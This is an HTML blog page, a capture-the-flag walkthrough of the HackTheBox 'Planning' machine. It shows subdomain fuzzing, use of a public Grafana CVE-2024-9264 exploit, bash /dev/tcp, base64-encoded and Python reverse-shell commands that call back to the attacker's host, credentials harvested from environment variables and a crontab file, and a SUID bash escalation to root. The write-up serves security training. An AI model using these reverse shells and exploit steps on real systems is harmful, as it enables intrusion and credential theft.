@@ -1,0 +1,636 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Planning Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Planning Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="date: 2025-09-23 12:00:00 -0500 tags: ctf, enumeration, exploit, planning, writeups, htb, writeups Difficulty: Easy Category: Comprehensive Penetration Target Machine: planning.htb&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-planning-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-planning-walkthrough/"},"headline":"HackTheBox Planning Walkthrough","datePublished":"2025-09-23T20:03+05:30","dateModified":"2026-09-30T20:05+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"date: 2025-09-23 12:00:00 -0500 tags: ctf, enumeration, exploit, planning, writeups, htb, writeups Difficulty: Easy Category: Comprehensive Penetration Target Machine: planning.htb&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Planning Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-23T20:03" class="feed__date">September 23, 2025</time></div></div></header></div><div class="entry-wrapper content__entry"><p>date: 2025-09-23 12:00:00 -0500<br>tags: ctf, enumeration, exploit, planning, writeups, htb, writeups</p><h1 id="🛡️-hackthebox---planning">🛡️ HackTheBox - Planning</h1><p><strong>Difficulty:</strong> Easy<br><strong>Category:</strong> Comprehensive Penetration<br><strong>Target Machine:</strong> <code>planning.htb</code> OR 10.10.11.68</p><h2 id="📌-overview">📌 Overview</h2><p>This HackTheBox machine focuses on web and infrastructure enumeration, subdomain discovery, public exploit usage, and privilege escalation via credential leakage and insecure crontab handling.</p><h2 id="🕵️-recon--enumeration">🕵️ Recon &amp; Enumeration</h2><h3 id="🔍-open-ports">🔍 Open Ports</h3><pre><code>nmap -sV -v -p- 10 10.10.11.68 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 11:36 IST
+Nmap scan report for planning.htb (10.10.11.68)
+Host is up (0.14s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><p>Nmap done: 1 IP address (1 host up) scanned in 2.77 seconds</p><h3 id="🌐-web-analysis-httpplanninghtb">🌐 Web Analysis (<code>http://planning.htb</code>)</h3><ul><li>The HTTP service provided minimal functionality.</li><li>Queries returned no useful data.</li><li>Directory brute-forcing and injection attempts were unsuccessful.</li><li>Switched focus to <strong>subdomain enumeration</strong>.</li></ul><hr><h3 id="🌐-subdomain-discovery">🌐 Subdomain Discovery</h3><pre><code>┌──(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
+└─$ ffuf -w /home/kali/Desktop/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u &#39;http://planning.htb&#39; -H &quot;Host: FUZZ.planning.htb&quot; -fs 178
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://planning.htb
+ :: Wordlist         : FUZZ: /home/kali/Desktop/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.planning.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 178
+________________________________________________
+
+grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 121ms]
+:: Progress: [4990/4990] :: Job [1/1] :: 350 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
+</code></pre><h3 id="discovered-httpgrafanaplanninghtb">Discovered: <code>http://grafana.planning.htb</code></h3><ul><li>Found a <strong>Grafana login form</strong></li><li><strong>Credentials (from challenge prompt):</strong></li></ul><p>Username: admin Password: 0D5oT70Fq13EvB5r</p><ul><li>After login:</li><li>Found <strong>Grafana version</strong>: <code>v11.0.0 (83b9528bce)</code></li><li>Vulnerable to <strong>CVE-2024-9264</strong> (RCE)</li><li></li></ul><pre><code>git clone https://github.com/nollium/CVE-2024-9264.git
+</code></pre><h2 id="inital-foothold">Inital Foothold</h2><h3 id="rce-exploit-used">RCE Exploit Used</h3><pre><code>┌──(venv)─(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
+└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -f /etc/passwd http://grafana.planning.htb 
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Reading file: /etc/passwd
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob(&#39;/etc/passwd&#39;):
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+grafana:x:472:0::/home/grafana:/usr/sbin/nologin
+</code></pre><p>To get Server access</p><pre><code class="language-bash">┌──(venv)─(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
+└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r \
+  -c &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.81/9001 0&gt;&amp;1&#39;&quot;  \
+  http://grafana.planning.htb
+ 
+</code></pre><p>or We can use encode version of this</p><pre><code>python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -c &quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44MS85MDAxIDA+JjE= | base64 -d | bash&quot;  http://grafana.planning.htb
+</code></pre><p>reverse shell</p><pre><code>┌──(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
+└─$ rlwrap  nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.16.81] from (UNKNOWN) [10.10.11.68] 51210
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@7ce659d667d7:~#
+</code></pre><h3 id="result-reverse-shell-access-as-root-inside-a-docker-container">Result: Reverse shell access as root, inside a Docker container</h3><p><strong>Docker Enumeration</strong></p><p>After 10+ hours of recon, environment inspection revealed plaintext credentials:</p><p>I found i can run linpeas their i git</p><pre><code>root@7ce659d667d7:~/conf# env
+env
+AWS_AUTH_SESSION_DURATION=15m                                                                                                                  
+HOSTNAME=7ce659d667d7
+PWD=/usr/share/grafana/conf
+AWS_AUTH_AssumeRoleEnabled=true
+GF_PATHS_HOME=/usr/share/grafana
+AWS_CW_LIST_METRICS_PAGE_LIMIT=500
+HOME=/usr/share/grafana
+AWS_AUTH_EXTERNAL_ID=
+SHLVL=2
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_USER=enzo
+GF_PATHS_DATA=/var/lib/grafana
+GF_PATHS_LOGS=/var/log/grafana
+PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+AWS_AUTH_AllowedAuthProviders=default,keys,credentials
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+_=/usr/bin/env
+OLDPWD=/usr/share/grafana
+</code></pre><h4 id="used-to-login-via-ssh">Used to login via SSH:</h4><h2 id="✅-user-shell-gained">✅ User shell gained</h2><pre><code>┌──(kali㉿kali)-[/media/…/ctf/hackthebox/planning/CVE-2024-9264]
+└─$ ssh enzo@planning.htb 
+The authenticity of host &#39;planning.htb (10.10.11.68)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;planning.htb&#39; (ED25519) to the list of known hosts.
+enzo@planning.htb&#39;s password: 
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat Sep 13 07:32:17 AM UTC 2025
+
+  System load:  0.28              Processes:             310
+  Usage of /:   71.1% of 6.30GB   Users logged in:       1
+  Memory usage: 52%               IPv4 address for eth0: 10.10.11.68
+  Swap usage:   13%
+
+  =&gt; There are 44 zombie processes.
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+102 updates can be applied immediately.
+77 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Sep 13 07:32:18 2025 from 10.10.16.81
+enzo@planning:~$ ls
+user.txt
+</code></pre><p>*<strong>� user.txt captured</strong></p><h2 id="⚙️-privilege-escalation">⚙️ Privilege Escalation</h2><p>**Download and Running linpeas and run it found **</p><p>🛢️ MySQL Discovery</p><pre><code>Netid          State           Recv-Q          Send-Q                   Local Address:Port                       Peer Address:Port          Process
+
+ udp            UNCONN          0               0                           127.0.0.54:domain                          0.0.0.0:*
+
+ udp            UNCONN          0               0                        127.0.0.53%lo:domain                          0.0.0.0:*
+
+tcp            LISTEN          0               4096                     127.0.0.53%lo:domain                          0.0.0.0:*
+
+tcp            LISTEN          0               511                            0.0.0.0:http                            0.0.0.0:*
+
+tcp            LISTEN          0               4096                         127.0.0.1:3000                            0.0.0.0:*
+
+tcp            LISTEN          0               511                          127.0.0.1:8000                            0.0.0.0:*
+
+tcp            LISTEN          0               151                          127.0.0.1:mysql                           0.0.0.0:*
+
+tcp            LISTEN          0               4096                         127.0.0.1:42051                           0.0.0.0:*
+
+tcp            LISTEN          0               4096                        127.0.0.54:domain                          0.0.0.0:*
+
+tcp            LISTEN          0               70                           127.0.0.1:33060                           0.0.0.0:*
+
+tcp            LISTEN          0               4096                                 *:ssh                                                         
+</code></pre><h3 id="crontab--found">Crontab Found</h3><p>Discovered crontab jobs in /opt/crontabs/crontab.db:</p><p>Used with root to log in to the restricted web interface</p><pre><code>╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /opt/crontabs/crontab.db: New Line Delimited JSON text data                                                                              
+Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 967, cookie 0x4, schema 4, UTF-8, version-valid-for 5
+Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 6, database pages 16, cookie 0x5, schema 4, UTF-8, version-valid-for 6
+Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
+</code></pre><p>Web config file exposed credentials:</p><pre><code>enzo@planning:/opt/crontabs$ cat crontab.db 
+{&quot;name&quot;:&quot;Grafana backup&quot;,&quot;command&quot;:&quot;/usr/bin/docker save root_grafana -o /var/backups/grafana.tar &amp;&amp; /usr/bin/gzip /var/backups/grafana.tar &amp;&amp; zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz &amp;&amp; rm /var/backups/grafana.tar.gz&quot;,&quot;schedule&quot;:&quot;@daily&quot;,&quot;stopped&quot;:false,&quot;timestamp&quot;:&quot;Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)&quot;,&quot;logging&quot;:&quot;false&quot;,&quot;mailing&quot;:{},&quot;created&quot;:1740774983276,&quot;saved&quot;:false,&quot;_id&quot;:&quot;GTI22PpoJNtRKg0W&quot;}
+{&quot;name&quot;:&quot;Cleanup&quot;,&quot;command&quot;:&quot;/root/scripts/cleanup.sh&quot;,&quot;schedule&quot;:&quot;* * * * *&quot;,&quot;stopped&quot;:false,&quot;timestamp&quot;:&quot;Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)&quot;,&quot;logging&quot;:&quot;false&quot;,&quot;mailing&quot;:{},&quot;created&quot;:1740849309992,&quot;saved&quot;:false,&quot;_id&quot;:&quot;gNIRXh1WIc9K7BYX&quot;}
+</code></pre><p>Logged into MySQL, but could not write a webshell or escalate further from here.</p><p>*<strong>� Port Forwarding to Port 8000</strong></p><pre><code>ssh -L 8000:127.0.0.1:8000 e--o@10.10.11.68 -N
+</code></pre><p>Found a new login panel on localhost:8000</p><p>None of the known credentials worked here</p><h3 id="🚀-final-exploitation-to-root">🚀 Final Exploitation to Root</h3><p>Uploaded reverse shell payload via cron configuration:</p><pre><code>python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.14.44&#39;,9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;
+</code></pre><h3 id="✅-root-shell-obtained">✅ Root shell obtained</h3><pre><code>enzo@planning:/tmp$ bash -p
+bash: /bash: No such file or directory
+enzo@planning:/tmp$ 
+enzo@planning:~$ /tmp/bash -p
+bash-5.2# ls
+bash
+FYyQq6kcae4CTKlC.stderr
+FYyQq6kcae4CTKlC.stdout
+lyqm3Iah0dEUqK3M.stderr
+lyqm3Iah0dEUqK3M.stdout
+pe1VfTlXTV7HCjzP.stderr
+pe1VfTlXTV7HCjzP.stdout
+rootbash
+ssh-PzP06Tegd13G
+systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-ModemManager.service-g494eX
+systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-polkit.service-Y7G0Wx
+systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-systemd-logind.service-8GTtlL
+systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-systemd-resolved.service-ehyoQy
+systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-systemd-timesyncd.service-62Ww0M
+systemd-private-00288c19c9a34ecd93f2e0d7597deb4c-upower.service-bPmFWq
+tmux-1000
+vmware-root_739-4248680507
+YvZsUUfEXayH6lLj.stderr
+YvZsUUfEXayH6lLj.stdout
+bash-5.2# id
+uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
+bash-5.2# cat /root/root.txt
+</code></pre><p>*<strong>� root.txt captured</strong></p><h2 id="✅-summary">✅ Summary</h2><p>Stage	Outcome</p><p>Port Scan	Found 22, 80</p><p>Subdomain Enum	Found grafana.planning.htb</p><p>Grafana Exploit	CVE-2024-9264 (RCE)</p><p>Docker Environment	Found enzo credentials</p><p>SSH Access	Gained user shell</p><p>MySQL Credentials	Accessed DB, no PE</p><p>Crontab Analysis	Found root web creds</p><p>Cron RCE	Gained root shell</p><h3 id="🧠-lessons-learned">🧠 Lessons Learned</h3><p>🔍 Subdomain enumeration can be the key to progress</p><p>📦 Docker environments often mask privilege boundaries</p><p>🧬 Environment variables may leak credentials</p><p>🕓 Crontab and ZIP file misconfigurations are powerful PE vectors</p><p>🔐 Always test all found credentials across services</p><h3 id="📁-files--exploits">📁 Files &amp; Exploits</h3><p>CVE-2024-9264 Exploit</p><p>Custom reverse shell payload via Python</p></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/crontab/">crontab</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/">CTF Writeups</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2024-9264/">CVE-2024-9264</a></li><li><a href="https://h4ck3rfirst.github.io/tags/docker/">Docker</a></li><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/grafana/">grafana</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/mysql/">mysql</a></li><li><a href="https://h4ck3rfirst.github.io/tags/subdomain/">subdomain</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-planning-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Planning%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-planning-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Planning%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-planning-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/hackthebox-nocturnal-walkthrough/" class="content__nav-link" rel="prev"><div><span>Previous</span> HackTheBox Nocturnal Walkthrough</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/hackthebox-smol-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> HackTheBox Smol Walkthrough</div><figure class="content__nav-image"><img src="https://h4ck3rfirst.github.io/media/posts/18/responsive/smol-xs.jpg" class="lazyload" loading="lazy" alt="" height="225" width="225"></figure></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/17/cheese.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/17/responsive/cheese-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="447" width="447" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-07-27T16:00" class="feed__date">July 27, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-cheese-walkthrough/">Tryhackme Cheese Walkthrough</a></h3></header><p>This is a write-up for the CheeseCTF Medium room on TryHackMe, which involves exploiting a vulnerable web application to escalate&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
